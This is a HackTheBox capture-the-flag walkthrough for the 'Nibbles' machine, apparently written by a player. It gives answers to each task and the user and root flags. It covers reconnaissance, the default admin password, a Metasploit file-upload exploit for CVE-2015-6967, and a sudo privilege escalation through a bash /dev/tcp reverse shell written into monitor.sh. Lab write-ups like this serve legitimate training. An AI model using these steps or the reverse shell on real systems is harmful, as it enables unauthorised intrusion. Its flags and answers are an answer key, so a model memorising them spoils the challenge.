# HackTheBox Walkthrough - Machine: Nibbles

**Target IP**: 10.129.243.127  
**Difficulty**: Easy  
**Objective**: Exploit the NibbleBlog CMS to gain user and root access.

---

## Task 1: How many open TCP ports are listening on Nibbles?
Performed an Nmap scan:
```bash
nmap -sV -sC -oA nmap/Nibbles 10.129.243.127
```
**Open Ports**:
- 22/tcp (SSH)
- 80/tcp (HTTP)

**Answer**: `2`

---

## Task 2: What is the relative path on the webserver to a blog?
Inspected the source of the home page:
```html
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```
**Answer**: `/nibbleblog`

---

## Task 3: What CMS is being used by the blog?
Accessed `/nibbleblog/` and checked the footer:
> Powered by Nibbleblog

**Answer**: `Nibbleblog`

---

## Task 4: What is the relative path to an XML file that contains the admin username?
Used feroxbuster to find XML files:
```bash
feroxbuster -u http://10.129.243.127/nibbleblog/
```
Found user config:
> /nibbleblog/content/private/users.xml

**Answer**: `/nibbleblog/content/private/users.xml`

---

## Task 5: What is the admin user's password?
Logged in via:
- **Username**: admin
- **Password**: Nibbles

**Answer**: `nibbles`

---

## Task 6: What version of Nibbleblog is running?
Checked settings after login:
> Nibbleblog 4.0.3 "Coffee"

**Answer**: `4.0.3`

---

## Task 7: What is the 2015 CVE for an authenticated file upload RCE?
Discovered via exploit-db:
> CVE-2015-6967

**Answer**: `CVE-2015-6967`

---

## Task 8: Which user is the Nibbleblog instance running as?
Used Metasploit module:
```bash
use multi/http/nibbleblog_file_upload
```
Gained meterpreter shell and ran `getuid`:
> `nibbler`

**Answer**: `nibbler`

---

## Submit User Flag
Read user flag from:
```bash
cat /home/nibbler/user.txt
```
**Answer**: `893797f82ce88e0b891bb58c95d80842`

---

## Task 10: What script can nibbler run as root?
Checked sudo permissions:
```bash
sudo -l
```
> (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh

**Answer**: `monitor.sh`

---

## Submit Root Flag
Created reverse shell in monitor.sh:
```bash
#!/bin/bash
IP="10.10.14.156"
PORT=7777
bash -i >& /dev/tcp/$IP/$PORT 0>&1
```
Ran it with:
```bash
sudo /home/nibbler/personal/stuff/monitor.sh
```

Then:
```bash
cat /root/root.txt
```

**Answer**: `085806261dc17eb756f71d56190e185d`

---
